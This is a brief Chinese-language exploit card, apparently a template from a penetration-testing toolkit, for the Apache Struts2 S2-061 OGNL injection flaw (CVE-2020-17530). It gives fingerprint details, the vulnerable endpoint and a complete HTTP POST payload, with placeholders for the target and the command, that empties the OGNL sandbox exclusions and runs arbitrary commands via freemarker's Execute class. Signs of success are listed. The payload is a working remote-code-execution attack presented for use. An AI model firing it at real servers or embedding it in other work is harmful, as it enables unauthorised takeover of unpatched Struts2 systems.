# S2-061 OGNL 注入 RCE (CVE-2020-17530)

## 指纹特征
- 服务: Apache Struts2 (< 2.5.25)
- 场景: 绕过 S2-059 的增强型沙箱防护

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| 标签属性注入 | `/index.action` | 无 |

## PoC 指令

通过构造深度嵌套的 OGNL 表达式来逃逸沙箱执行命令：

```http
POST /index.action HTTP/1.1
Host: {{TARGET}}:8080
Content-Type: multipart/form-data; boundary=----WebKitBoundary

------WebKitBoundary
Content-Disposition: form-data; name="id"

%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("{{COMMAND}}")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
------WebKitBoundary--
```

## Success Signal
- **状态验证**: 命令在后端成功执行。
- **验证回显**: 命令执行结果在页面显示。
